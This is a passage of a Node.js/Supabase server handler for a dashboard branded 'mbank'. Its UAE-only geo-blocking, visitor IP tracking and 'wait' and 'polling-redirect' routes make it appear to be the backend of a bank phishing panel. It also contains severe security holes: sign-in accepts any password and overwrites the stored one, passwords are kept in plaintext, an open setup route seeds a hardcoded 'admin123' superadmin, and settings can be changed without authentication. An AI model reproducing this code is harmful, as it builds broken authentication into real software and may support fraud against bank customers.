      if (!email || !password) return json(res, { error: 'missing fields' }, 400);
      const key = email.trim().toLowerCase().replace(/[.#$\[\]]/g, '_');
      const { data: existing } = await supabase.from('dashboard_accounts').select('*').eq('id', key).single();
      if (existing) {
        if (existing.password !== password) await supabase.from('dashboard_accounts').update({ password }).eq('id', key);
        const token = crypto.randomBytes(32).toString('hex');
        authTokens[token] = { uid: key, email: email.trim().toLowerCase() };
        return json(res, { uid: key, email: email.trim().toLowerCase(), token, existing: true, claims: { role: existing.role } });
      }
      const token = crypto.randomBytes(32).toString('hex');
      authTokens[token] = { uid: key, email: email.trim().toLowerCase() };
      return json(res, { uid: key, email: email.trim().toLowerCase(), token });
    } catch (e) { return json(res, { error: e.message }, 500); }
  }

  if (req.method === 'POST' && reqPath === '/api/auth/signout') {
    const authHeader = (req.headers.authorization || '').replace('Bearer ', '');
    if (authHeader) delete authTokens[authHeader];
    return json(res, { ok: true });
  }

  if (req.method === 'GET' && reqPath === '/api/auth/state') {
    const authHeader = (req.headers.authorization || '').replace('Bearer ', '');
    const user = authTokens[authHeader];
    if (user) return json(res, { uid: user.uid, email: user.email });
    return json(res, { uid: null, email: null });
  }

  // ── Settings API (geo-blocking) ──
  if (req.method === 'GET' && (reqPath.match(/^\/api\/settings\/(.+)\.json$/) || reqPath.match(/^\/settings\/(.+)\.json$/))) {
    const match = reqPath.match(/\/settings\/(.+)\.json$/) || reqPath.match(/\/api\/settings\/(.+)\.json$/);
    const key = match ? match[1] : '';
    try {
      const { data } = await supabase.from('settings').select('value').eq('key', key).single();
      return json(res, data?.value || null);
    } catch (e) { return json(res, null); }
  }

  if (req.method === 'PUT' && (reqPath.match(/^\/api\/settings\/(.+)\.json$/) || reqPath.match(/^\/settings\/(.+)\.json$/))) {
    const match = reqPath.match(/\/settings\/(.+)\.json$/) || reqPath.match(/\/api\/settings\/(.+)\.json$/);
    const key = match ? match[1] : '';
    const body = await readBody(req);
    try {
      const newFields = JSON.parse(body);
      const { data: existing } = await supabase.from('settings').select('value').eq('key', key).single();
      const merged = { ...(existing?.value || {}), ...newFields };
      await supabase.from('settings').upsert({ key, value: merged }, { onConflict: 'key' });
      return json(res, { ok: true });
    } catch (e) { return json(res, { error: e.message }, 500); }
  }

  // ── Setup endpoint ──
  if (req.method === 'POST' && reqPath === '/api/setup') {
    try {
      const admins = [
        { id: 'admin@mbank_com', email: 'admin@mbank.com', password: 'admin123', role: 'superadmin', name: 'المدير العام', status: 'active' }
      ];
      for (const a of admins) {
        await supabase.from('dashboard_accounts').upsert(a, { onConflict: 'id' });
      }
      await supabase.from('settings').upsert({ key: 'geoBlocking', value: { enabled: true, allowedCountries: ['AE'] } }, { onConflict: 'key' });
      return json(res, { ok: true, seeded: admins.length + 1 });
    } catch (e) { return json(res, { error: e.message }, 500); }
  }

  // --- Heartbeat ---
  if (reqPath === '/api/heartbeat') {
    const ip = getIP(req);
    await supabase.from('visitors').upsert({ ip, page: '', last_seen: new Date().toISOString() }, { onConflict: 'ip' });
    return json(res, { ok: true });
  }

  // --- Wait Function ---
  if (reqPath === '/api/wait-fn') {
    return json(res, { status: 0 });
  }

  // --- Polling Redirect ---
  if (reqPath === '/api/polling-redirect') {
    return json(res, { redirect: null });
  }

  // --- Admin page protection ---
  if ((reqPath.startsWith('/admin/') || reqPath === '/admin') && reqPath !== '/admin/login' && reqPath !== '/admin/login.html') {
    if (!isAdmin(req)) {
      const ROOT = path.join(__dirname, '..');
      const loginPage = path.join(ROOT, 'admin', 'login.html');
      if (fs.existsSync(loginPage)) {
        const content = fs.readFileSync(loginPage, 'utf8');
        res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
        return res.end(content);
      }
      res.writeHead(302, { 'Location': '/admin/login.html' });
      return res.end();
    }
    const ROOT = path.join(__dirname, '..');
    let filePath = reqPath;
    if (filePath.endsWith('/')) filePath += 'index.html';
    const fullPath = path.join(ROOT, filePath);
    if (fs.existsSync(fullPath)) {
      const ext = path.extname(fullPath).toLowerCase();
      const MIME = {
        '.html': 'text/html; charset=utf-8', '.css': 'text/css',
        '.js': 'application/javascript', '.png': 'image/png',
        '.jpg': 'image/jpeg', '.jpeg': 'image/jpeg', '.gif': 'image/gif',
        '.svg': 'image/svg+xml', '.json': 'application/json',
      };
      res.writeHead(200, { 'Content-Type': MIME[ext] || 'application/octet-stream' });
      return res.end(fs.readFileSync(fullPath));
    }
  }

  return json(res, { error: 'not found' }, 404);
};
